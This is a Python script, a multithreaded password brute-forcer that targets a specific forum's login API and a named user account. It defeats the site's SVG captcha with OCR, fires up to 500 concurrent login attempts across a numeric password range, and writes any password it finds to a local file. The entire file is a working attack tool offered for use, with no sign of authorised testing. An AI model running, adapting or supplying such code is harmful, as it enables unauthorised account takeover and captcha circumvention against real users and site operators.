import requests
import time
import os
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

class PasswordCracker:
    def __init__(self):
        self.base_url = os.environ.get('BASE_URL', 'https://mk48by049.mbbs.cc')
        self.target_username = os.environ.get('TARGET_USERNAME', 'shangde')
        self.api_base = f'{self.base_url}/bbs'
        self.captcha_url = f'{self.api_base}/login/captcha'
        self.login_url = f'{self.api_base}/login'
        
        # 解析密码范围
        segment = os.environ.get('PASSWORD_SEGMENT', '100000-199999')
        start, end = map(int, segment.split('-'))
        self.password_range = range(start, end + 1)
        
        # 高频配置
        self.max_workers = 500
        self.found_password = None
        self.attempts = 0
        self.start_time = time.time()

    def init_ocr(self):
        try:
            import ddddocr
            return ddddocr.DdddOcr(show_ad=False)
        except:
            return None

    def svg_to_png(self, svg_content):
        try:
            import cairosvg
            return cairosvg.svg2png(bytestring=svg_content.encode('utf-8'))
        except:
            return None

    def save_password_to_file(self, password):
        """保存密码到文件"""
        try:
            with open('found_password.txt', 'w', encoding='utf-8') as f:
                f.write(f"目标用户: {self.target_username}\n")
                f.write(f"密码: {password}\n")
                f.write(f"发现时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"爆破范围: {self.password_range[0]}-{self.password_range[-1]}\n")
                f.write(f"总尝试次数: {self.attempts}\n")
            print(f"💾 密码已保存到 found_password.txt")
            return True
        except Exception as e:
            print(f"❌ 保存密码文件失败: {e}")
            return False

    def try_password(self, password):
        if self.found_password:
            return None
            
        session = requests.Session()
        ocr = self.init_ocr()
        if not ocr:
            return None
            
        self.attempts += 1
        
        try:
            # 获取验证码
            resp = session.get(self.captcha_url, timeout=2)
            if resp.status_code == 200:
                data = resp.json().get('data', {})
                captcha_id, svg_data = data.get('id'), data.get('svg')
                
                if captcha_id and svg_data:
                    # 识别验证码
                    png_data = self.svg_to_png(svg_data)
                    if png_data:
                        captcha_text = ocr.classification(png_data)
                        captcha_text = re.sub(r'[^A-Za-z0-9]', '', captcha_text).upper()
                        
                        if captcha_text:
                            # 尝试登录
                            login_data = {
                                'username': self.target_username,
                                'password': str(password),
                                'captcha_id': captcha_id,
                                'captcha_text': captcha_text
                            }
                            
                            resp = session.post(self.login_url, json=login_data, timeout=3)
                            if resp.status_code == 200:
                                result = resp.json()
                                if result.get('success') and result.get('data'):
                                    print(f'🎉 找到密码: {password}')
                                    # 保存密码到文件
                                    if self.save_password_to_file(password):
                                        self.found_password = password
                                        return password
            
            # 显示进度
            if self.attempts % 100 == 0:
                elapsed = time.time() - self.start_time
                rate = self.attempts / elapsed
                print(f'📊 尝试: {self.attempts}, 速率: {rate:.1f}次/秒')
                
        except:
            pass
            
        return None

    def run(self):
        print(f'🚀 开始爆破 - 用户: {self.target_username}')
        print(f'🔢 范围: {self.password_range[0]}-{self.password_range[-1]}')
        print(f'🧵 并发: {self.max_workers}')
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {executor.submit(self.try_password, pwd): pwd for pwd in self.password_range}
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    self.found_password = result
                    # 取消所有未完成的任务
                    for f in futures:
                        f.cancel()
                    break
        
        if self.found_password:
            print(f'✅ 爆破完成! 密码: {self.found_password}')
            # 确保文件已创建
            if not os.path.exists('found_password.txt'):
                self.save_password_to_file(self.found_password)
        else:
            print('❌ 未找到密码')

if __name__ == "__main__":
    cracker = PasswordCracker()
    cracker.run()

